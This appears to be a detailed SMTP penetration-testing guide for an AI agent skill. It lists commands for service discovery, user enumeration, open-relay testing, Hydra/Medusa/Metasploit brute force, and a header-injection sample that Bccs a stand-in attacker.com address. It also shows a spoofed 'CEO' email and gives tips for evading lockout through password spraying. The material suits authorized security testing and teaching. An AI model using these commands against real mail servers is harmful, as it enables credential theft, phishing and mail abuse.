# SMTP Penetration Testing - Detailed Guide

> This file contains the detailed procedure and reference material extracted from `SKILL.md` for focused loading. The root skill defines activation, examples, safety constraints, and limitations.

## Purpose

Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.


## Outputs and Deliverables

1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings
2. **User Enumeration Results** - Valid email addresses discovered
3. **Relay Test Results** - Open relay status and exploitation potential
4. **Remediation Recommendations** - Security hardening guidance


## Core Workflow

### Phase 1: SMTP Architecture Understanding

```
Components: MTA (transfer) → MDA (delivery) → MUA (client)

Ports: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternative)

Workflow: Sender MUA → Sender MTA → DNS/MX → Recipient MTA → MDA → Recipient MUA
```

### Phase 2: SMTP Service Discovery

Identify SMTP servers and versions:

```bash
# Discover SMTP ports
nmap -p 25,465,587,2525 -sV TARGET_IP

# Aggressive service detection
nmap -sV -sC -p 25 TARGET_IP

# SMTP-specific scripts
nmap --script=smtp-* -p 25 TARGET_IP

# Discover MX records for domain
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

### Phase 3: Banner Grabbing

Retrieve SMTP server information:

```bash
# Using Telnet
telnet TARGET_IP 25
# Response: 220 mail.target.com ESMTP Postfix

# Using Netcat
nc TARGET_IP 25
# Response: 220 mail.target.com ESMTP

# Using Nmap
nmap -sV -p 25 TARGET_IP
# Version detection extracts banner info

# Manual SMTP commands
EHLO test
# Response reveals supported extensions
```

Parse banner information:

```
Banner reveals:
- Server software (Postfix, Sendmail, Exchange)
- Version information
- Hostname
- Supported SMTP extensions (STARTTLS, AUTH, etc.)
```

### Phase 4: SMTP Command Enumeration

Test available SMTP commands:

```bash
# Connect and test commands
nc TARGET_IP 25

# Initial greeting
EHLO attacker.com

# Response shows capabilities:
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-8BITMIME
250 DSN
```

Key commands to test:

```bash
# VRFY - Verify user exists
VRFY admin
250 2.1.5 admin@target.com

# EXPN - Expand mailing list
EXPN staff
250 2.1.5 user1@target.com
250 2.1.5 user2@target.com

# RCPT TO - Recipient verification
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
# 250 OK = user exists
# 550 = user doesn't exist
```

### Phase 5: User Enumeration

Enumerate valid email addresses:

```bash
# Using smtp-user-enum with VRFY
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using EXPN method
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using RCPT method
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP

# Specify port and domain
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run
```

Using Nmap:

```bash
# SMTP user enumeration script
nmap --script smtp-enum-users -p 25 TARGET_IP

# With custom user list
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
```

### Phase 6: Open Relay Testing

Test for unauthorized email relay:

```bash
# Using Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# Manual testing via Telnet
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT

# If accepted (250 OK), server is open relay
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

Test variations:

```bash
# Test different sender/recipient combinations
MAIL FROM:<>
MAIL FROM:<test@[attacker_IP]>
MAIL FROM:<test@target.com>

RCPT TO:<test@external.com>
RCPT TO:<"test@external.com">
RCPT TO:<test%external.com@target.com>
```

### Phase 7: Brute Force Authentication

Test for weak SMTP credentials:

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# With specific port and SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# Multiple users
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Verbose output
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

Using Medusa:

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

### Phase 8: SMTP Command Injection

Test for command injection vulnerabilities:

```bash
# Header injection test
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

Email spoofing test:

```bash
# Spoofed sender (tests SPF/DKIM protection)
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
Subject: Urgent Request
Please process this request immediately.
.
```

### Phase 9: TLS/SSL Security Testing

Test encryption configuration:

```bash
# STARTTLS support check
openssl s_client -connect TARGET_IP:25 -starttls smtp

# Direct SSL (port 465)
openssl s_client -connect TARGET_IP:465

# Cipher enumeration
nmap --script ssl-enum-ciphers -p 25 TARGET_IP
```

### Phase 10: SPF, DKIM, DMARC Analysis

Check email authentication records:

```bash
# SPF/DKIM/DMARC record lookups
dig TXT target.com | grep spf            # SPF
dig TXT selector._domainkey.target.com    # DKIM
dig TXT _dmarc.target.com                 # DMARC

# SPF policy: -all = strict fail, ~all = soft fail, ?all = neutral
```


## Quick Reference

### Essential SMTP Commands

| Command | Purpose | Example |
|---------|---------|---------|
| HELO | Identify client | `HELO client.com` |
| EHLO | Extended HELO | `EHLO client.com` |
| MAIL FROM | Set sender | `MAIL FROM:<sender@test.com>` |
| RCPT TO | Set recipient | `RCPT TO:<user@target.com>` |
| DATA | Start message body | `DATA` |
| VRFY | Verify user | `VRFY admin` |
| EXPN | Expand alias | `EXPN staff` |
| QUIT | End session | `QUIT` |

### SMTP Response Codes

| Code | Meaning |
|------|---------|
| 220 | Service ready |
| 221 | Closing connection |
| 250 | OK / Requested action completed |
| 354 | Start mail input |
| 421 | Service not available |
| 450 | Mailbox unavailable |
| 550 | User unknown / Mailbox not found |
| 553 | Mailbox name not allowed |

### Enumeration Tool Commands

| Tool | Command |
|------|---------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
| Netcat | `nc IP 25` then manual commands |

### Common Vulnerabilities

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Open Relay | High | Relay test with external recipient |
| User Enumeration | Medium | VRFY/EXPN/RCPT commands |
| Banner Disclosure | Low | Banner grabbing |
| Weak Auth | High | Brute force attack |
| No TLS | Medium | STARTTLS test |
| Missing SPF/DKIM | Medium | DNS record lookup |


## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Connection Refused | Port blocked or closed | Check port with nmap; ISP may block port 25; try 587/465; use VPN |
| VRFY/EXPN Disabled | Server hardened | Use RCPT TO method; analyze response time/code variations |
| Brute Force Blocked | Rate limiting/lockout | Slow down (`hydra -W 5`); use password spraying; check for fail2ban |
| SSL/TLS Errors | Wrong port or protocol | Use 465 for SSL, 25/587 for STARTTLS; verify EHLO response |
